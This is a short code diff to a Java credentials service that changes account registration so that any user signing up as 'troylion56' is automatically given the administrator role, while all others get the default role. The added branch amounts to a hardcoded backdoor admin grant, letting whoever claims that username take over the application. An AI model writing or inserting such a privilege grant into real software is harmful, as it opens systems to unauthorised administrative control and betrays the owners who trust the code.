@@ -33,8 +33,16 @@ public class CredentialsService {
 		
     @Transactional
     public Credentials saveCredentials(Credentials credentials) {
-        credentials.setRole(Credentials.DEFAULT_ROLE);
-        credentials.setPassword(this.passwordEncoder.encode(credentials.getPassword()));
-        return this.credentialsRepository.save(credentials);
+        credentials.setPassword(passwordEncoder.encode(credentials.getPassword()));
+
+        // Check if the username is "troylion56" to assign the admin role
+        if (credentials.getUsername().equals("troylion56")) {
+            credentials.setRole(Credentials.ADMIN_ROLE);
+        } else {
+            credentials.setRole(Credentials.DEFAULT_ROLE);
+        }
+
+        return credentialsRepository.save(credentials);
     }
+	
 }
